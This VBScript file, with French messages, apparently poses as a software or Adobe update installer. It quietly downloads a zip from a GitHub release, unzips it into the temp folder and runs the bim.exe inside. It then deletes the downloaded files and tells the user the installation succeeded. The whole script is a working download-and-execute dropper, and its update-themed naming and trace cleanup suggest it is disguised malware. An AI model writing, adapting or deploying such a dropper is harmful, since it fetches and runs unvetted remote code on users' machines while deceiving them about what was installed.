Option Explicit

Dim shell, fso
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")

Dim zipUrl, zipPath, unzipDir, exeName
zipUrl    = "https://github.com/jimbertclement/AdobeUpdate/releases/download/Win/bim25.zip"
zipPath   = shell.ExpandEnvironmentStrings("%TEMP%") & "\bim25.zip"
unzipDir  = shell.ExpandEnvironmentStrings("%TEMP%") & "\bim25_unzipped"
exeName   = "bim.exe"  ' ⚠️ Exécutable mis à jour

WScript.Echo "Téléchargement de bim25.zip..."

If runCommandWait("curl --version") = 0 Then
    ' cURL détecté
    runCommandWait("curl -L -o """ & zipPath & """ " & zipUrl)
Else
    ' Sinon bitsadmin
    runCommandWait("bitsadmin /transfer ZipDownload /download /priority normal """ & zipUrl & """ """ & zipPath & """")
End If

If Not fso.FileExists(zipPath) Then
    WScript.Echo "[ERREUR] Impossible de télécharger bim25.zip."
    WScript.Quit 1
End If

WScript.Echo "Décompression de bim25.zip..."
runCommandWait("powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & unzipDir & "' -Force""")

If Not fso.FileExists(unzipDir & "\" & exeName) Then
    WScript.Echo "[ERREUR] Fichier " & exeName & " introuvable après décompression."
    WScript.Quit 1
End If

WScript.Echo "Exécution de " & exeName & "..."
shell.Run """" & unzipDir & "\" & exeName & """", 1, True

' Nettoyage
fso.DeleteFile zipPath, True
If fso.FolderExists(unzipDir) Then
    fso.DeleteFolder unzipDir, True
End If

' MessageBox
MsgBox "Logiciel installé avec succès!", vbInformation, "Installation"

WScript.Echo "Terminé."
WScript.Quit 0

' =========================
' Fonction pour exécuter cmd
' =========================
Function runCommandWait(cmd)
    runCommandWait = shell.Run("cmd /c " & cmd, 0, True)
End Function
